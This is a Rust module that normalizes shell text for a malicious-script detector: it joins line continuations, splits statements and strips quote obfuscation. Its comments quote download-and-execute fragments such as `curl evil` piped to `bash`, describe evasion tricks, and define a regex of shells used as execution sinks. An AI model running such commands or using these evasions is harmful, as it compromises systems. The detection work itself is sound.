//! Shared text-normalization helpers for analyzing shell content.
//!
//! Detectors match line by line, but bash treats a backslash-newline as a line
//! *continuation*: the two physical lines are one logical command. A naive
//! per-physical-line matcher is therefore trivially evaded --
//! `curl evil \` + newline + `| bash` puts `curl ...` and `| bash` on different
//! physical lines so a `curl .*| sh` rule never fires. [`logical_lines`] splices
//! continuations back together so detectors see the command the shell will
//! actually run, while still reporting the originating physical line number.

/// One open construct on the lexer's stack.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Frame {
    /// `'...'`
    Single,
    /// `$'...'` (backslash escapes the next byte).
    Ansi,
    /// `"..."`
    Double,
    /// `$( .. )`, `<( .. )`, `>( .. )`: code context; payload is plain-paren depth.
    CmdSub(i32),
    /// `` `..` ``: code context.
    Backtick,
    /// `${ .. }`: nothing inside is a comment or a heredoc opener.
    Brace,
    /// `$(( .. ))` / `(( .. ))`: payload is paren depth.
    Arith(i32),
    /// `$[ .. ]`
    ArithBracket,
}

/// Lexer state carried across physical lines: the stack of open quotes and
/// expansions.
#[derive(Clone, Debug, Default)]
pub(crate) struct LexState {
    stack: Vec<Frame>,
    /// Plain `(` minus `)` outside every quote and expansion (array bodies and
    /// subshell groups), carried across lines. Never below zero.
    pub(crate) depth: i32,
}

impl LexState {
    /// Whether a quote or expansion is open (the next line starts inside it).
    pub(crate) fn is_open(&self) -> bool {
        !self.stack.is_empty()
    }
}

const MAX_LEX_DEPTH: usize = 48;

/// One heredoc operator found on a line (`<<EOF`, `<<-'EOF'`, `<<"E"OF`).
#[derive(Clone, Debug)]
pub(crate) struct HeredocOpener {
    /// The full delimiter word after shell quote removal.
    pub delim: String,
    /// Any quote or backslash appeared in the delimiter word: the body is not
    /// expanded by the shell.
    pub quoted: bool,
    /// `<<-`: leading tabs are stripped from the terminator line.
    pub strip_tabs: bool,
    /// Byte offset of the `<<`.
    pub start: usize,
    /// Byte offset just past the delimiter word.
    pub end: usize,
}

/// What [`scan_line`] learned about one physical line.
#[derive(Clone, Debug, Default)]
pub(crate) struct LineScan {
    /// The line ends in an unescaped backslash outside single quotes and
    /// comments: bash joins the next physical line onto it.
    pub continues: bool,
    /// The line ends in an unquoted `|`, `|&`, `&&` or `||`: bash keeps reading
    /// the command on the next line.
    pub ends_op: bool,
    /// Heredoc operators on this line, in order.
    pub openers: Vec<HeredocOpener>,
    /// Byte offsets of the `&` of every unquoted `|&` (shorthand for `2>&1 |`).
    pub pipe_amps: Vec<usize>,
    /// The lexer met something it does not model faithfully (a heredoc inside
    /// backticks, `case` inside `$( )`, a `$'..'` ending in a backslash, a stack
    /// that is too deep). Nothing may be treated as inert from this line on.
    pub uncertain: bool,
    /// Byte offset of the `)` that brought [`LexState::depth`] back to zero on
    /// this line, if it did.
    pub close_at: Option<usize>,
    /// A quote or expansion was already open when the line began.
    pub open_at_start: bool,
    /// Paren depth ([`LexState::depth`]) when the line began.
    pub depth_at_start: i32,
    /// A quote or expansion was still open when the line ended (set by
    /// [`classify_lines`]).
    pub open_at_end: bool,
}

fn is_word_break(c: u8) -> bool {
    c.is_ascii_whitespace() || matches!(c, b';' | b'|' | b'&' | b'(' | b')' | b'<' | b'>')
}

/// Whether a `#` at `i` starts a comment: it must begin a word, i.e. follow
/// whitespace or a shell metacharacter (`;` `&` `|` `(` `)` `<` `>`).
fn comment_starts_at(b: &[u8], i: usize) -> bool {
    i == 0 || is_word_break(b[i - 1])
}

/// Parse the heredoc delimiter word starting at `j` (after `<<` and optional
/// `-`/blanks). Returns `(word, quoted, end)`.
fn read_heredoc_word(b: &[u8], mut j: usize) -> (Vec<u8>, bool, usize) {
    let n = b.len();
    let mut word: Vec<u8> = Vec::new();
    let mut quoted = false;
    while j < n && !is_word_break(b[j]) {
        match b[j] {
            b'\\' => {
                quoted = true;
                if let Some(&nx) = b.get(j + 1) {
                    word.push(nx);
                }
                j += 2;
            }
            b'\'' => {
                quoted = true;
                j += 1;
                while j < n && b[j] != b'\'' {
                    word.push(b[j]);
                    j += 1;
                }
                j += 1;
            }
            b'"' => {
                quoted = true;
                j += 1;
                while j < n && b[j] != b'"' {
                    if b[j] == b'\\' && j + 1 < n {
                        j += 1;
                    }
                    word.push(b[j]);
                    j += 1;
                }
                j += 1;
            }
            b'$' if b.get(j + 1) == Some(&b'\'') => {
                quoted = true;
                j += 2;
                while j < n && b[j] != b'\'' {
                    if b[j] == b'\\' && j + 1 < n {
                        j += 1;
                    }
                    word.push(b[j]);
                    j += 1;
                }
                j += 1;
            }
            ch => {
                word.push(ch);
                j += 1;
            }
        }
    }
    (word, quoted, j.min(n))
}

/// Lex one physical line the way bash would, with a stack of open quotes and
/// expansions carried in `st` across lines. Models single/double/ANSI-C quotes,
/// `$( )`, `<( )`, backticks, `${ }`, `$(( ))`/`(( ))`/`$[ ]`, comments (a `#`
/// only at the start of a word, never inside `${ }`), here-strings, heredoc
/// operators and trailing continuations. Anything it cannot follow faithfully
/// sets [`LineScan::uncertain`].
pub(crate) fn scan_line(line: &str, st: &mut LexState) -> LineScan {
    let b = line.as_bytes();
    let n = b.len();
    let mut out = LineScan {
        open_at_start: st.is_open(),
        depth_at_start: st.depth,
        ..LineScan::default()
    };
    let mut i = 0usize;
    macro_rules! push {
        ($f:expr) => {{
            if st.stack.len() >= MAX_LEX_DEPTH {
                out.uncertain = true;
            } else {
                st.stack.push($f);
            }
        }};
    }
    while i < n {
        let c = b[i];
        let top = st.stack.last().cloned();
        match top {
            Some(Frame::Single) => {
                if c == b'\'' {
                    st.stack.pop();
                }
                i += 1;
                continue;
            }
            Some(Frame::Ansi) => {
                match c {
                    b'\\' => {
                        if i + 1 == n {
                            out.uncertain = true;
                        }
                        i += 2;
                    }
                    b'\'' => {
                        st.stack.pop();
                        i += 1;
                    }
                    _ => i += 1,
                }
                continue;
            }
            Some(Frame::Arith(d)) => {
                match c {
                    b'(' => {
                        if let Some(Frame::Arith(x)) = st.stack.last_mut() {
                            *x += 1;
                        }
                    }
                    b')' => {
                        if d <= 1 {
                            st.stack.pop();
                        } else if let Some(Frame::Arith(x)) = st.stack.last_mut() {
                            *x -= 1;
                        }
                    }
                    _ => {}
                }
                i += 1;
                continue;
            }
            Some(Frame::ArithBracket) => {
                if c == b']' {
                    st.stack.pop();
                }
                i += 1;
                continue;
            }
            Some(Frame::Double) | Some(Frame::Brace) => {
                let in_brace = top == Some(Frame::Brace);
                match c {
                    b'\\' => {
                        if i + 1 == n {
                            out.continues = true;
                        }
                        i += 2;
                    }
                    b'"' if !in_brace => {
                        st.stack.pop();
                        i += 1;
                    }
                    b'"' => {
                        push!(Frame::Double);
                        i += 1;
                    }
                    b'\'' if in_brace => {
                        push!(Frame::Single);
                        i += 1;
                    }
                    b'}' if in_brace => {
                        st.stack.pop();
                        i += 1;
                    }
                    b'`' => {
                        push!(Frame::Backtick);
                        i += 1;
                    }
                    b'$' => match b.get(i + 1) {
                        Some(b'(') if b.get(i + 2) == Some(&b'(') => {
                            push!(Frame::Arith(2));
                            i += 3;
                        }
                        Some(b'(') => {
                            push!(Frame::CmdSub(0));
                            i += 2;
                        }
                        Some(b'{') => {
                            push!(Frame::Brace);
                            i += 2;
                        }
                        Some(b'[') => {
                            push!(Frame::ArithBracket);
                            i += 2;
                        }
                        Some(b'\'') if in_brace => {
                            push!(Frame::Ansi);
                            i += 2;
                        }
                        _ => i += 1,
                    },
                    _ => i += 1,
                }
                continue;
            }
            Some(Frame::Backtick) if c == b'`' => {
                st.stack.pop();
                i += 1;
                continue;
            }
            _ => {}
        }
        // Code context: top level, `$( )` or backticks.
        let in_cmdsub = matches!(top, Some(Frame::CmdSub(_)));
        let in_backtick = top == Some(Frame::Backtick);
        let prev_op = out.ends_op;
        if !c.is_ascii_whitespace() {
            out.ends_op = false;
        }
        match c {
            b'\\' => {
                if i + 1 == n {
                    out.continues = true;
                }
                i += 2;
            }
            b'\'' => {
                push!(Frame::Single);
                i += 1;
            }
            b'"' => {
                push!(Frame::Double);
                i += 1;
            }
            b'`' => {
                push!(Frame::Backtick);
                i += 1;
            }
            b'$' => match b.get(i + 1) {
                Some(b'\'') => {
                    push!(Frame::Ansi);
                    i += 2;
                }
                Some(b'(') if b.get(i + 2) == Some(&b'(') => {
                    push!(Frame::Arith(2));
                    i += 3;
                }
                Some(b'(') => {
                    push!(Frame::CmdSub(0));
                    i += 2;
                }
                Some(b'{') => {
                    push!(Frame::Brace);
                    i += 2;
                }
                Some(b'[') => {
                    push!(Frame::ArithBracket);
                    i += 2;
                }
                _ => i += 1,
            },
            b'<' | b'>' if b.get(i + 1) == Some(&b'(') => {
                push!(Frame::CmdSub(0));
                i += 2;
            }
            b'(' => {
                if in_cmdsub {
                    if let Some(Frame::CmdSub(d)) = st.stack.last_mut() {
                        *d += 1;
                    }
                    i += 1;
                } else if b.get(i + 1) == Some(&b'(')
                    && (i == 0 || (is_word_break(b[i - 1]) && b[i - 1] != b'<' && b[i - 1] != b'>'))
                {
                    // `(( x << 2 ))` arithmetic command. (bash may re-parse
                    // `((a); b)` as nested subshells; any opener skipped here is
                    // simply never treated as inert.)
                    push!(Frame::Arith(2));
                    i += 2;
                } else {
                    if st.stack.is_empty() {
                        st.depth += 1;
                    }
                    i += 1;
                }
            }
            b')' => {
                if in_cmdsub {
                    if let Some(Frame::CmdSub(d)) = st.stack.last_mut() {
                        if *d == 0 {
                            st.stack.pop();
                        } else {
                            *d -= 1;
                        }
                    }
                } else if st.stack.is_empty() && st.depth > 0 {
                    st.depth -= 1;
                    if st.depth == 0 && out.close_at.is_none() {
                        out.close_at = Some(i);
                    }
                }
                i += 1;
            }
            b'#' if comment_starts_at(b, i) => {
                // Comment to end of line: no continuation, nothing else to see.
                out.continues = false;
                out.ends_op = prev_op;
                return out;
            }
            b'|' => {
                if b.get(i + 1) == Some(&b'&') && b.get(i + 2) != Some(&b'&') {
                    out.pipe_amps.push(i + 1);
                    i += 1;
                }
                out.ends_op = true;
                i += 1;
            }
            b'&' if b.get(i + 1) == Some(&b'&') => {
                out.ends_op = true;
                i += 2;
            }
            b'<' if b.get(i + 1) == Some(&b'<') => {
                if b.get(i + 2) == Some(&b'<') {
                    i += 3; // here-string
                    continue;
                }
                let start = i;
                let mut j = i + 2;
                let strip_tabs = b.get(j) == Some(&b'-');
                if strip_tabs {
                    j += 1;
                }
                while j < n && (b[j] == b' ' || b[j] == b'\t') {
                    j += 1;
                }
                let (word, quoted, end) = read_heredoc_word(b, j);
                if !word.is_empty() {
                    if in_backtick {
                        out.uncertain = true;
                    }
                    out.openers.push(HeredocOpener {
                        delim: String::from_utf8_lossy(&word).into_owned(),
                        quoted,
                        strip_tabs,
                        start,
                        end,
                    });
                }
                i = end.max(start + 2);
            }
            b'c' if st.stack.iter().any(|f| matches!(f, Frame::CmdSub(_)))
                && comment_starts_at(b, i)
                && b[i..].starts_with(b"case")
                && b.get(i + 4).is_none_or(|&x| is_word_break(x)) =>
            {
                // The `)` of a case pattern would be miscounted as the end of
                // the `$( )`.
                out.uncertain = true;
                i += 4;
            }
            _ => i += 1,
        }
    }
    out
}

/// A heredoc found by [`classify_lines`].
#[derive(Clone, Debug)]
pub(crate) struct Heredoc {
    /// Index of the line carrying the operator.
    pub open_line: usize,
    /// Index of the first body line.
    pub body_start: usize,
    /// Index of the terminator line (body is `body_start..end`).
    pub end: usize,
    /// Number of heredoc operators on the opening line.
    pub openers_on_line: usize,
    pub opener: HeredocOpener,
}

/// Per-line lexer facts for a list of lines.
pub(crate) struct Classified {
    /// `None` for heredoc body and terminator lines (not lexed as shell).
    pub scans: Vec<Option<LineScan>>,
    pub heredocs: Vec<Heredoc>,
    /// First line the lexer was unsure about; nothing from here on may be
    /// treated as inert.
    pub uncertain_from: Option<usize>,
}

/// Split `content` into physical lines on `\n` only. Unlike `str::lines` this
/// keeps a trailing `\r`, because bash does not accept `EOF\r` as a heredoc
/// terminator.
pub fn split_lines(content: &str) -> Vec<&str> {
    let mut v: Vec<&str> = content.split('\n').collect();
    if v.last() == Some(&"") {
        v.pop();
    }
    v
}

fn is_terminator(line: &str, o: &HeredocOpener) -> bool {
    let l = if o.strip_tabs {
        line.trim_start_matches('\t')
    } else {
        line
    };
    l == o.delim
}

/// Lex `lines` (physical or already-spliced) and locate every heredoc. A heredoc
/// whose terminator never arrives is NOT a region: bash would swallow the rest of
/// the file, but the scanner fails toward scanning instead, so an unterminated
/// opener can never hide later code. Terminators match byte-for-byte (a trailing
/// `\r` is part of the line).
pub(crate) fn classify_lines(lines: &[&str]) -> Classified {
    let n = lines.len();
    let mut scans: Vec<Option<LineScan>> = vec![None; n];
    let mut heredocs = Vec::new();
    let mut st = LexState::default();
    let mut uncertain_from = None;
    let mut pending: std::collections::VecDeque<(usize, usize, HeredocOpener)> = Default::default();
    let mut last_continues = false;
    let mut no_term_from: std::collections::HashMap<(String, bool), usize> = Default::default();
    let mut i = 0usize;
    while i < n {
        if !last_continues {
            if let Some((open_line, on_line, o)) = pending.front().cloned() {
                // Negative cache: if no terminator exists from line `p` on, none
                // exists from any later line either (keeps a flood of unterminated
                // openers linear).
                let key = (o.delim.clone(), o.strip_tabs);
                let found = if no_term_from.get(&key).is_some_and(|&p| i >= p) {
                    None
                } else {
                    let f = (i..n).find(|&j| is_terminator(lines[j], &o));
                    if f.is_none() {
                        no_term_from.insert(key, i);
                    }
                    f
                };
                match found {
                    Some(j) => {
                        heredocs.push(Heredoc {
                            open_line,
                            body_start: i,
                            end: j,
                            openers_on_line: on_line,
                            opener: o,
                        });
                        pending.pop_front();
                        i = j + 1;
                        continue;
                    }
                    None => {
                        pending.pop_front();
                        continue;
                    }
                }
            }
        }
        let mut s = scan_line(lines[i], &mut st);
        s.open_at_end = st.is_open();
        if s.uncertain && uncertain_from.is_none() {
            uncertain_from = Some(i);
        }
        last_continues = s.continues;
        let cnt = s.openers.len();
        for o in &s.openers {
            pending.push_back((i, cnt, o.clone()));
        }
        scans[i] = Some(s);
        i += 1;
    }
    Classified {
        scans,
        heredocs,
        uncertain_from,
    }
}

/// Split shell `content` into logical lines, splicing backslash-newline
/// continuations. Returns `(first_physical_line, logical_line)` pairs where
/// `first_physical_line` is the 1-based number of the physical line the logical
/// line started on (for accurate finding locations).
///
/// Mirrors bash: a trailing backslash is a continuation only when it is
/// unquoted-or-double-quoted and outside a comment and a heredoc body (a `\` at
/// the end of `# note \` or of a body line is literal text, so the next line is
/// NOT joined). The backslash and newline are removed and the next physical line
/// concatenated directly. A line ending in an unquoted `|`, `|&`, `&&` or `||`
/// also continues onto the next line (bash keeps reading the pipeline), joined
/// with a space; blank and comment-only lines in between are absorbed. `|&` is
/// rewritten to `|`. Line numbers stay anchored to the first physical line.
pub fn logical_lines(content: &str) -> Vec<(usize, String)> {
    let phys: Vec<&str> = split_lines(content);
    let cls = classify_lines(&phys);
    let mut out: Vec<(usize, String)> = Vec::new();
    let mut cur = String::new();
    let mut start_line = 0usize;
    let mut open = false;
    let mut op_join = false;

    for (i, line) in phys.iter().enumerate() {
        let Some(scan) = &cls.scans[i] else {
            // Heredoc body / terminator: stands alone, never spliced.
            if open {
                out.push((start_line, std::mem::take(&mut cur)));
                open = false;
                op_join = false;
            }
            out.push((i + 1, (*line).to_string()));
            continue;
        };
        if op_join {
            let t = line.trim();
            if t.is_empty() || t.starts_with('#') {
                continue; // blank / comment between `|` and the next command
            }
        }
        if !open {
            start_line = i + 1;
            open = true;
        }
        op_join = false;
        // Drop the `&` of each `|&` (stderr merge) so pipe sinks see a plain `|`.
        let mut text = std::borrow::Cow::Borrowed(*line);
        if !scan.pipe_amps.is_empty() {
            let mut s = String::with_capacity(line.len());
            let mut last = 0;
            for &p in &scan.pipe_amps {
                s.push_str(&line[last..p]);
                last = p + 1;
            }
            s.push_str(&line[last..]);
            text = std::borrow::Cow::Owned(s);
        }
        if scan.continues {
            // Continuation: drop the final backslash and keep accumulating.
            cur.push_str(&text[..text.len() - 1]);
        } else if scan.ends_op && scan.openers.is_empty() && i + 1 < phys.len() {
            cur.push_str(&text);
            cur.push(' ');
            op_join = true;
        } else {
            cur.push_str(&text);
            out.push((start_line, std::mem::take(&mut cur)));
            open = false;
        }
    }
    if open {
        out.push((start_line, cur));
    }
    out
}

/// Split one logical shell line into simple statements at UNQUOTED `;`, `&&`,
/// `||` and a lone `&` (background), returning `(statement, separator)` pairs so
/// the original line can be rebuilt by concatenation. Quote-aware (`'..'`,
/// `".."`, backslash escapes, backticks) and does not split inside `$( .. )`,
/// `<( .. )`, `>( .. )` or `name=( .. )` groups, nor inside `${ .. }`. A trailing
/// `# comment` is left attached to the last statement. Used so several
/// assignments / commands on one line (`c=curl; s=sh; $c url | $s`) are seen in
/// order.
pub fn split_statements(line: &str) -> Vec<(String, String)> {
    let b: Vec<char> = line.chars().collect();
    let mut out: Vec<(String, String)> = Vec::new();
    let mut cur = String::new();
    let (mut sq, mut dq, mut bt) = (false, false, false);
    let mut depth = 0i32; // () and ${} groups
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if c == '\\' && !sq && i + 1 < b.len() {
            cur.push(c);
            cur.push(b[i + 1]);
            i += 2;
            continue;
        }
        if sq {
            if c == '\'' {
                sq = false;
            }
            cur.push(c);
            i += 1;
            continue;
        }
        match c {
            '\'' if !dq => sq = true,
            '"' => dq = !dq,
            '`' => bt = !bt,
            '#' if !dq
                && !bt
                && depth == 0
                && (cur.is_empty() || cur.ends_with(char::is_whitespace)) =>
            {
                cur.extend(&b[i..]);
                break;
            }
            '(' if !dq => {
                let prev = cur.chars().last();
                let grouped = matches!(prev, Some('$' | '<' | '>' | '='))
                    || prev.is_some_and(|p| p.is_alphanumeric() || p == '_');
                if grouped || depth > 0 {
                    depth += 1;
                }
            }
            ')' if !dq && depth > 0 => depth -= 1,
            '{' if !dq && cur.ends_with('$') => depth += 1,
            '}' if !dq && depth > 0 => depth -= 1,
            _ => {}
        }
        if !dq && !bt && depth == 0 {
            let two: String = b[i..(i + 2).min(b.len())].iter().collect();
            let sep = if two == "&&" || two == "||" {
                Some(two)
            } else if c == ';' {
                Some(";".to_string())
            } else if c == '&' && !cur.ends_with(['>', '<', '|']) && b.get(i + 1) != Some(&'>') {
                Some("&".to_string())
            } else {
                None
            };
            if let Some(sep) = sep {
                let adv = sep.chars().count();
                out.push((std::mem::take(&mut cur), sep));
                i += adv;
                continue;
            }
        }
        cur.push(c);
        i += 1;
    }
    out.push((cur, String::new()));
    out
}

/// Split a statement into shell words at unquoted whitespace, keeping quoting
/// intact (so each word can later be normalized) and keeping `$( .. )`, `( .. )`
/// and `${ .. }` groups and backtick spans together as part of one word.
pub fn split_words(stmt: &str) -> Vec<String> {
    let b: Vec<char> = stmt.chars().collect();
    let mut words: Vec<String> = Vec::new();
    let mut cur = String::new();
    let (mut sq, mut dq, mut bt) = (false, false, false);
    let mut depth = 0i32;
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if c == '\\' && !sq && i + 1 < b.len() {
            cur.push(c);
            cur.push(b[i + 1]);
            i += 2;
            continue;
        }
        if sq {
            if c == '\'' {
                sq = false;
            }
            cur.push(c);
            i += 1;
            continue;
        }
        match c {
            '\'' if !dq => sq = true,
            '"' => dq = !dq,
            '`' => bt = !bt,
            '(' if !dq => depth += 1,
            ')' if !dq && depth > 0 => depth -= 1,
            '{' if !dq && cur.ends_with('$') => depth += 1,
            '}' if !dq && depth > 0 => depth -= 1,
            _ => {}
        }
        if c.is_whitespace() && !sq && !dq && !bt && depth == 0 {
            if !cur.is_empty() {
                words.push(std::mem::take(&mut cur));
            }
        } else {
            cur.push(c);
        }
        i += 1;
    }
    if !cur.is_empty() {
        words.push(cur);
    }
    words
}

/// A small stateful scanner that tracks shell brace depth while ignoring braces
/// that appear inside single/double quotes (with backslash escapes) or in a `#`
/// comment. Function and install-hook body extraction relies on brace balance
/// to find where a body ends; a naive counter is desynchronized by a `}` inside
/// a string (`echo "}"`) OR inside a trailing comment (`: # note }`), letting an
/// attacker push code (e.g. a `sudo` line) outside the parsed body and past the
/// privilege/hook analyzers. This scanner skips both so that trick no longer
/// truncates the body.
///
/// A `#` only begins a comment when it is unquoted and preceded by whitespace
/// (or the start of a line) -- the same rule the shell uses -- so it does NOT
/// mistake `${var#word}` parameter expansion or `$#` for a comment. Comment
/// state ends at a newline (and is reset at the start of each [`BraceScanner::feed`] call,
/// since callers feed one line at a time). Quote/escape state persists across
/// calls so multi-line strings are handled.
pub struct BraceScanner {
    in_single: bool,
    in_double: bool,
    in_comment: bool,
    escaped: bool,
    /// Whether the previous character was whitespace / start-of-line.
    prev_ws: bool,
    /// Net brace depth seen so far.
    pub depth: i32,
    /// Highest depth reached so far (so a body that opens and closes within a
    /// single fed line is still recognized as having been entered).
    pub peak: i32,
}

impl Default for BraceScanner {
    fn default() -> Self {
        Self {
            in_single: false,
            in_double: false,
            in_comment: false,
            escaped: false,
            prev_ws: true, // start of input is a word boundary
            depth: 0,
            peak: 0,
        }
    }
}

impl BraceScanner {
    /// Feed a single character, updating quote/comment state and brace depth.
    pub fn feed_char(&mut self, c: char) {
        if c == '\n' {
            self.in_comment = false;
            self.escaped = false;
            self.prev_ws = true;
            return;
        }
        if self.in_comment {
            return;
        }
        if self.escaped {
            self.escaped = false;
            self.prev_ws = false;
            return;
        }
        match c {
            '\\' if !self.in_single => {
                self.escaped = true;
                self.prev_ws = false;
            }
            '\'' if !self.in_double => {
                self.in_single = !self.in_single;
                self.prev_ws = false;
            }
            '"' if !self.in_single => {
                self.in_double = !self.in_double;
                self.prev_ws = false;
            }
            '#' if !self.in_single && !self.in_double && self.prev_ws => {
                self.in_comment = true;
            }
            '{' if !self.in_single && !self.in_double => {
                self.depth += 1;
                if self.depth > self.peak {
                    self.peak = self.depth;
                }
                self.prev_ws = false;
            }
            '}' if !self.in_single && !self.in_double => {
                self.depth -= 1;
                self.prev_ws = false;
            }
            ' ' | '\t' => self.prev_ws = true,
            _ => self.prev_ws = false,
        }
    }

    /// Feed a chunk of text (e.g. one line, without its newline). Comment state
    /// is reset at the start of each line.
    pub fn feed(&mut self, s: &str) {
        self.in_comment = false;
        self.prev_ws = true;
        for c in s.chars() {
            self.feed_char(c);
        }
    }
}

/// Decode one ANSI-C (`$'...'`) backslash escape. `rest` is the text *after* the
/// backslash. Returns the decoded character(s) and how many chars of `rest` were
/// consumed. Mirrors bash `$'...'`: `\xHH` (1-2 hex), `\NNN`/`\0NNN` (1-3 octal),
/// and the usual `\n \t \r \a \b \e \f \v \\ \' \" \?` controls.
fn decode_ansic_escape(rest: &[char]) -> (String, usize) {
    if rest.is_empty() {
        return (String::from("\\"), 0);
    }
    match rest[0] {
        'x' => {
            // up to two hex digits
            let hex: String = rest[1..]
                .iter()
                .take(2)
                .take_while(|c| c.is_ascii_hexdigit())
                .collect();
            if hex.is_empty() {
                return (String::from("x"), 1);
            }
            let val = u32::from_str_radix(&hex, 16).unwrap_or(0);
            (char_from(val), 1 + hex.len())
        }
        '0'..='7' => {
            // up to three octal digits (the first digit is rest[0])
            let oct: String = rest.iter().take(3).take_while(|c| c.is_digit(8)).collect();
            let val = u32::from_str_radix(&oct, 8).unwrap_or(0);
            (char_from(val), oct.len())
        }
        'n' => ("\n".into(), 1),
        't' => ("\t".into(), 1),
        'r' => ("\r".into(), 1),
        'a' => ("\u{07}".into(), 1),
        'b' => ("\u{08}".into(), 1),
        'e' | 'E' => ("\u{1b}".into(), 1),
        'f' => ("\u{0c}".into(), 1),
        'v' => ("\u{0b}".into(), 1),
        '\\' => ("\\".into(), 1),
        '\'' => ("'".into(), 1),
        '"' => ("\"".into(), 1),
        '?' => ("?".into(), 1),
        c => (c.to_string(), 1),
    }
}

fn char_from(val: u32) -> String {
    char::from_u32(val)
        .map(|c| c.to_string())
        .unwrap_or_default()
}

/// Re-render a shell word the way the shell would, with the quoting *removed*:
/// `$'...'` ANSI-C escapes are decoded, single/double quotes are dropped, and
/// adjacent quoted segments concatenate. So `"b"'u''n'` -> `bun` and
/// `$'\x63'"d"` -> `cd`. Unquoted whitespace (the real word boundaries) and any
/// `$(...)`/`${...}` expansions are preserved so detectors still see the command
/// structure. This is a normalization for *matching*, not a faithful evaluator.
pub fn normalize_shell_quoting(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '$' && chars.get(i + 1) == Some(&'(') && chars.get(i + 2) == Some(&')') {
            // `$()` expands to nothing: `n$()pm` is `npm`.
            i += 3;
        } else if c == '`' && chars.get(i + 1) == Some(&'`') {
            // An empty backtick pair expands to nothing as well.
            i += 2;
        } else if c == '$' && chars.get(i + 1) == Some(&'"') {
            // Locale quoting `$"..."` behaves as plain `"..."`; drop the `$`.
            i += 1;
        } else if c == '$' && i + 1 < chars.len() && chars[i + 1] == '\'' {
            // ANSI-C quoting: decode until the closing single quote.
            i += 2;
            while i < chars.len() && chars[i] != '\'' {
                if chars[i] == '\\' {
                    let (decoded, used) = decode_ansic_escape(&chars[i + 1..]);
                    out.push_str(&decoded);
                    i += 1 + used;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            i += 1; // closing quote
        } else if c == '\'' {
            i += 1;
            while i < chars.len() && chars[i] != '\'' {
                out.push(chars[i]);
                i += 1;
            }
            i += 1;
        } else if c == '"' {
            i += 1;
            while i < chars.len() && chars[i] != '"' {
                if chars[i] == '$'
                    && chars.get(i + 1) == Some(&'(')
                    && chars.get(i + 2) == Some(&')')
                {
                    i += 3;
                } else if chars[i] == '`' && chars.get(i + 1) == Some(&'`') {
                    i += 2;
                } else if chars[i] == '\\'
                    && i + 1 < chars.len()
                    && matches!(chars[i + 1], '$' | '`' | '"' | '\\')
                {
                    out.push(chars[i + 1]);
                    i += 2;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            i += 1;
        } else if c == '\\' && i + 1 < chars.len() {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(c);
            i += 1;
        }
    }
    out
}

/// True when a line carries hallmarks of character-level obfuscation: ANSI-C
/// hex/octal escapes (`$'\x63'`, `$'\141'`) or adjacent single-character quoted
/// segments used to split a word (`"b"'u''n'`). Legitimate PKGBUILDs/install
/// scripts effectively never do this; malware uses it to dodge literal matching.
pub fn looks_obfuscated(line: &str) -> bool {
    ANSIC_ESCAPE.is_match(line) || QUOTE_SPLIT.is_match(line)
}

/// Return the de-obfuscated form of `line` when normalization actually changes
/// it; otherwise `None`. Detectors match this in *addition* to the raw line so an
/// evaded payload is still seen.
///
/// This deliberately does NOT gate on a narrow obfuscation heuristic. The old
/// `looks_obfuscated` gate only recognized single-character quote-splitting
/// (`"b"'u''n'`) and ANSI-C escapes, so a 2-character split (`"cu""rl"`) or a
/// backslash-escaped word (`c\url`) slipped past de-obfuscation entirely (the
/// marquee feature missed them). Instead we normalize every line and
/// emit the result only when it differs from the raw line, so *any* quoting /
/// escaping that the shell would collapse is decoded for matching. Normalization
/// is faithful (it only removes quoting/escaping the shell removes; word
/// boundaries and `$(...)`/`${...}` are preserved), so an ordinary quoted string
/// decodes to the same command the shell runs — it does not fabricate tokens.
pub fn deobfuscate(line: &str) -> Option<String> {
    let norm = normalize_shell_quoting(line);
    (norm != line).then_some(norm)
}

/// De-obfuscate a whole block **line by line**, preserving the line count (and
/// therefore line numbers) so analyzers that report a line — or scan the whole
/// text — see the decoded payload at its real location. Lines that normalize to
/// themselves are kept verbatim.
pub fn deobfuscate_text(text: &str) -> String {
    let mut out: Vec<String> = text
        .lines()
        .map(|l| deobfuscate(l).unwrap_or_else(|| l.to_string()))
        .collect();
    // Preserve a trailing newline distinction is unnecessary for matching; join
    // with '\n' which is what every caller scans against.
    if out.is_empty() {
        return String::new();
    }
    std::mem::take(&mut out).join("\n")
}

use regex::Regex;
use std::sync::LazyLock;
/// ANSI-C hex/octal escape inside `$'...'`.
static ANSIC_ESCAPE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$'[^']*\\(?:x[0-9A-Fa-f]{1,2}|[0-7]{1,3})").unwrap());
/// Two or more adjacent single-character quoted segments (the `"b"'u''n'` split).
static QUOTE_SPLIT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"(?:["'][A-Za-z0-9]["']){2,}"#).unwrap());

/// The detection-rule regex for the quote-splitting obfuscation technique itself
/// (`OBF-006`). Exposed so the rule and the heuristic stay in sync.
pub const QUOTE_SPLIT_PATTERN: &str = r#"(["'][A-Za-z0-9]["']){2,}"#;

/// Explicit, curated **whole-word alternation** of real shells that execute a
/// piped or fetched script. EXPLICIT on purpose: the old `(?:ba|z|k|c|da|tc|fi)?sh`
/// suffix-trick silently missed `dash`/`ash`/`mksh` (a `d?sh` is `dsh`/`sh`, never
/// `dash`), so coverage was unauditable. Enumerating the real set closes the
/// download-and-execute sink class exhaustively (the interpreter set is finite).
///
/// Reused at EVERY sink (DLE-001/002, OBF-011, EXEC-002, deep `EXEC_SINK`,
/// remote_exec `FETCH_EXEC`) composed as `{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b`
/// — the surrounding `\b…\b` anchors mean the short names (`sh`, `nu`, `osh`,
/// `oil`) cannot match mid-word (`crash`, `| number`, `| oilcheck`, `nutool`).
/// Longest-prefix-first ordering is harmless (the trailing `\b` already rejects a
/// short partial like `ksh` inside `ksh93`). `busybox ash`/`busybox sh` are
/// reached via the launcher. Bare obscure shells beyond this set are deferred to
/// wave-2 vector coverage. Non-capturing for safe embedding.
pub const SHELLS: &str = r"(?:elvish|xonsh|ksh93|pdksh|loksh|rbash|bash|dash|mksh|oksh|posh|yash|fish|tcsh|oils|zsh|csh|ksh|ash|oil|osh|nu|sh)";

